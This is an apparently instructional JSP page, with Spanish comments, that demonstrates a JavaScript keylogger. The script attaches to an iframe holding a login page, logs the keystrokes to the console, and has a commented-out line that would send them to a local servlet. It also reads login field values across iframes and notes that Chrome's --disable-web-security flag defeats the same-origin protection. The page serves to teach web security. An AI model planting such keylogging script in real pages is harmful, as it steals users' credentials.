<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>

<script>
//Esta parte de un keylogger como el que hemos visto
var keys = '';

function funcionKeyLogger(){
	//iframe1 tiene el login autentico, por lo que quiero enterarme 
	//de las teclas que se pulsan en ese iframe
	//Un navegador serio no deja inspeccionar componentes dentro de iFrames
	//cuyo source se ha obtenido de otro dominio
	var iframe1 = document.getElementById("iframe1");
	iframe1.contentDocument.onkeypress = function(e) {
	    var get = window.event ? event : e;
	    var key = get.keyCode ? get.keyCode : get.charCode;
	    key = String.fromCharCode(key);
	    keys += key;
	}
	 
	window.setInterval(function(){
		//Esta vez en vez de mandar la peticion con lo que ha escritio
		//lo saco por la consola, F12 y ver consola
	    //new Image().src = 'http://localhost:8080/Ej08_XSS_Cookies_Indeseables/SVTeclas?t=' + keys;
	    console.log(keys);
	    keys = '';
	}, 2000);
}
//Fin del key logger

function accederIframes(){
	
	var iframe2 = document.getElementById("iframe2");
	var innerDoc2 = iframe2.contentDocument || iframe2.contentWindow.document;
	console.log(innerDoc2.getElementById("dato").value);

	//Este codigo fallaría si iframe1 lo hemos descargado de otro dominio
	//diferente al nuestro(www.elpais.com). 
	//Un navegador serio no deja inspeccionar componentes dentro de iFrames
	//cuyo source se ha obtenido de otro dominio
	var iframe1 = document.getElementById("iframe1");
	var innerDoc1 = iframe1.contentDocument || iframe1.contentWindow.document;
	console.log(innerDoc1.getElementById("login").value);
	//console.log(innerDoc1.getElementsByTagName("body")[0].innerHTML);
}

</script>

<body onload="funcionKeyLogger()">
<!-- Con este parametro SI permitiría un navegador chrome inspeccionar componentes
	de un iframe cuyo source se ha obtenido de otros dominios, por lo que un 
	usuario podria sentarse	en nuestro sitio y ejecutarnos el chrome con este 
	parametro. Hay su equivalente para otros navegadores
 -->
<h2 align="center"><font color="lightGreen">--disable-web-security</font></h2>

<p align="center">
 	<iframe id="iframe1" width="500px" src="http://localhost:8080/Ej04_Sesion/login.html"></iframe>
	<iframe id="iframe2" src="contenido.html"></iframe>
</p>

<p align="center">
	<input type="button" onclick="accederIframes()" value="Mostrar Login y Dato"/>
</p>

</body>
</html>



